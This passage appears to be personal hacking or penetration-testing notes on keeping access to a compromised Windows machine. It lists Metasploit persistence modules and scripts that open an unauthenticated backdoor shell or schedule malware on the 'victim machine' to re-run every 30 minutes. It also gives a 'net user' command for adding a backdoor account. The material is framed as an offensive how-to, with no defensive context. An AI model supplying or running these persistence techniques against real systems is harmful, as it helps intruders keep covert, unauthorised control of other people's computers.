### How to maintain access
For maintaining access you can do many things you might use metasploit to run some persistence script or add a user manually

##### Metasploit
In metasploit the following persistence script will open a remote port on the target machine with no authentication so when you try to connect to that port you will get a shell
```bash
run persistence -h

exploit/windows/local/persistence

exploit/windows/local/registry_persistence
```

The following scripts will run schedule tasks. So if you have a malware in the victim machine then you can schedule the machine to run that malware every 30 mins so if the computer is rebooted in between it will again run in every 30 mins and you will get a shell

```bash
run scheduleme

run schtaskabuse
```

##### Manual
If you don't want that much complexity you can simple add a new user and login through that user
```powershell
net user <username> <PASS> /add
```

![[Pasted image 20210730090727.png]]